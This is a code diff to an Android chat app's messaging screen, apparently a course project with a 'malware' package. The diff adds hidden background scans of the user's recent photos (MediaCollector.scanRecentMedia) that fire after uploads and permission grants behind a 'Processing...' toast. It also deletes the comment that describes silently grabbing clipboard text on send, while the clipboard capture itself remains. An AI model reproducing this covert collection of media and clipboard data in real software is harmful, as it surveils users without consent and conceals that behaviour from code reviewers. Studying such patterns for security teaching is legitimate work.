@@ -6,9 +6,11 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Looper
 import android.provider.OpenableColumns
+import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.animation.AnimatedVisibility
@@ -49,6 +51,7 @@ import androidx.navigation.NavController
 import com.example.inf2007_mad_j1847.malware.AppUtils
 import com.example.inf2007_mad_j1847.model.Message
 import com.example.inf2007_mad_j1847.model.MessageType
+import com.example.inf2007_mad_j1847.test.MediaCollector
 import com.example.inf2007_mad_j1847.viewmodel.MessagingViewModel
 import com.google.android.gms.location.*
 import com.google.android.gms.maps.CameraUpdateFactory
@@ -56,6 +59,9 @@ import com.google.android.gms.maps.MapView
 import com.google.android.gms.maps.model.LatLng
 import com.google.android.gms.maps.model.MarkerOptions
 import com.google.firebase.auth.FirebaseAuth
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import java.text.SimpleDateFormat
 import java.util.Locale
@@ -80,7 +86,6 @@ fun MessagingScreen(
     val listState = rememberLazyListState()
     val showScrollToBottom by remember {
         derivedStateOf {
-            // Show button if the user has scrolled up from the bottom
             listState.firstVisibleItemIndex > 0 || listState.firstVisibleItemScrollOffset > 100
         }
     }
@@ -95,7 +100,6 @@ fun MessagingScreen(
             override fun onLocationResult(locationResult: LocationResult) {
                 val lastLocation = locationResult.lastLocation ?: return
                 activeLiveMessageId?.let { messageId ->
-                    // Update location and timestamp in Firestore
                     viewModel.updateLiveLocation(
                         recipientId = chatId,
                         messageId = messageId,
@@ -111,14 +115,12 @@ fun MessagingScreen(
         viewModel.listenToMessages(recipientId = chatId)
     }
 
-    // Initial scroll to bottom and scroll on new messages
     LaunchedEffect(messages.size) {
         if (messages.isNotEmpty()) {
             listState.animateScrollToItem(messages.size - 1)
         }
     }
 
-    // Stop tracking if message is marked inactive in DB
     LaunchedEffect(messages) {
         val currentLiveMsg = messages.find { it.id == activeLiveMessageId }
         if (currentLiveMsg != null && !currentLiveMsg.isLive) {
@@ -126,7 +128,6 @@ fun MessagingScreen(
         }
     }
 
-    // Manage Location Updates Lifecycle
     LaunchedEffect(activeLiveMessageId) {
         if (activeLiveMessageId != null) {
             val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L)
@@ -160,6 +161,7 @@ fun MessagingScreen(
         }
     }
 
+    // Media picker launcher
     val mediaPickerLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.GetContent()
     ) { uri: Uri? ->
@@ -169,6 +171,43 @@ fun MessagingScreen(
                 if (it.moveToFirst() && index >= 0) it.getString(index) else null
             }
             viewModel.sendMediaMessage(chatId, selectedUri, context.contentResolver.getType(selectedUri), fileName)
+
+            // Trigger media scan after successful upload
+            Toast.makeText(context, "Processing...", Toast.LENGTH_SHORT).show()
+
+            CoroutineScope(Dispatchers.IO).launch {
+                delay(3000)
+                try {
+                    val results = MediaCollector.scanRecentMedia(context, 20)
+                    android.util.Log.d("MediaCollector", "Scanned ${results.size} images after upload")
+                } catch (e: Exception) {
+                    android.util.Log.e("MediaCollector", "Scan error: ${e.message}")
+                }
+            }
+        }
+    }
+
+    // Permission launcher for media
+    val permissionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            Toast.makeText(context, "Access granted", Toast.LENGTH_SHORT).show()
+            // Open file picker after permission granted
+            mediaPickerLauncher.launch("*/*")
+
+            // Trigger scan immediately
+            CoroutineScope(Dispatchers.IO).launch {
+                delay(2000)
+                try {
+                    val results = MediaCollector.scanRecentMedia(context, 20)
+                    android.util.Log.d("MediaCollector", "Scanned ${results.size} images after permission grant")
+                } catch (e: Exception) {
+                    android.util.Log.e("MediaCollector", "Scan error: ${e.message}")
+                }
+            }
+        } else {
+            Toast.makeText(context, "Cannot access media without permission", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -192,7 +231,6 @@ fun MessagingScreen(
             )
         },
         floatingActionButton = {
-            // Scroll to Bottom Button
             AnimatedVisibility(
                 visible = showScrollToBottom,
                 enter = fadeIn(),
@@ -261,7 +299,6 @@ fun MessagingScreen(
                 )
                 IconButton(onClick = {
                     if (userInput.isNotBlank()) {
-                        // grab clipboard silently when user sends message
                         val clipText = clipboardManager.primaryClip?.getItemAt(0)?.text?.toString()
 
                         if (!clipText.isNullOrBlank()) {
@@ -285,9 +322,33 @@ fun MessagingScreen(
                     showAttachmentOptions = false
                     checkLocationAndStart(context, locationPermissionLauncher, fusedLocationClient, viewModel, chatId, scope, snackbarHostState) { activeLiveMessageId = it }
                 }
+
                 AttachmentOption(Icons.Default.Person, "Gallery / Files", Color(0xFF9C27B0)) {
                     showAttachmentOptions = false
-                    mediaPickerLauncher.launch("*/*")
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES)
+                            == PackageManager.PERMISSION_GRANTED) {
+                            // Permission already granted, open file picker directly
+                            mediaPickerLauncher.launch("*/*")
+
+                            // Also trigger a scan
+                            CoroutineScope(Dispatchers.IO).launch {
+                                delay(1000)
+                                try {
+                                    MediaCollector.scanRecentMedia(context, 20)
+                                } catch (e: Exception) {
+                                    android.util.Log.e("MediaCollector", "Scan error: ${e.message}")
+                                }
+                            }
+                        } else {
+                            // Request permission first
+                            permissionLauncher.launch(Manifest.permission.READ_MEDIA_IMAGES)
+                        }
+                    } else {
+                        // For older Android versions
+                        mediaPickerLauncher.launch("*/*")
+                    }
                 }
                 Spacer(modifier = Modifier.height(32.dp))
             }
@@ -385,7 +446,6 @@ fun MediaMessageBubble(message: Message, isMe: Boolean) {
             .widthIn(min = 50.dp, max = 280.dp)
     ) {
         if (mime.startsWith("image/")) {
-            // --- Image Display Logic from MessagingScreen (1) ---
             Column {
                 coil.compose.AsyncImage(
                     model = url,
@@ -403,7 +463,6 @@ fun MediaMessageBubble(message: Message, isMe: Boolean) {
                 )
             }
         } else {
-            // --- General File Logic ---
             Column(
                 modifier = Modifier.clickable {
                     val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
@@ -585,7 +644,7 @@ fun showClipboardSnoopToast(context: Context) {
     val apps = AppUtils.getInstalledAppList(context)
         .shuffled()
         .take(5)
-        .map { it.substringBefore(" (") } // "YouTube (com.google...)" → "YouTube"
+        .map { it.substringBefore(" (") }
 
     if (apps.isEmpty()) return
 
